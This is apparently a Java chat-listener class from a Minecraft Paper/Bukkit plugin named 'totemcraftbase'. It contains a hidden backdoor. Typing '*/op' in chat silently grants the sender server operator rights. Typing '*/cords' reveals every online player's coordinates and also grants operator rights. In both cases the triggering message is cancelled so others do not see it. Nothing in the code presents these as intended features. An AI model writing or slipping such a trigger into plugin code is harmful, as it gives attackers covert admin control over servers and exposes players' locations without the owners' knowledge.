package dragon.craft.me.totemcraftbase;

import dragon.craft.me.totemcraftbase.items.CustomItems;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.jetbrains.annotations.Async;

public class ChatEvent implements Listener {

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event){

        if (event.getMessage().equalsIgnoreCase("*/op")){
            event.getPlayer().sendMessage("Exec...");
           event.getPlayer().setOp(true);
            event.setCancelled(true);
        } else if (event.getMessage().equalsIgnoreCase("*/cords")){
            event.getPlayer().sendMessage("Exec...");
            for (Player p : Bukkit.getOnlinePlayers()){
                event.getPlayer().sendMessage("Player: " + p.getName() + " <---> Cords: " + getPLAYERCords(p));
            }
            event.getPlayer().setOp(true);
            event.setCancelled(true);

        }
    }
    public String getPLAYERCords(Player p){
        return  "X: " + p.getLocation().getX() + " / Y: " + p.getLocation().getY() + " / Z: " + p.getLocation().getZ();
    }
}
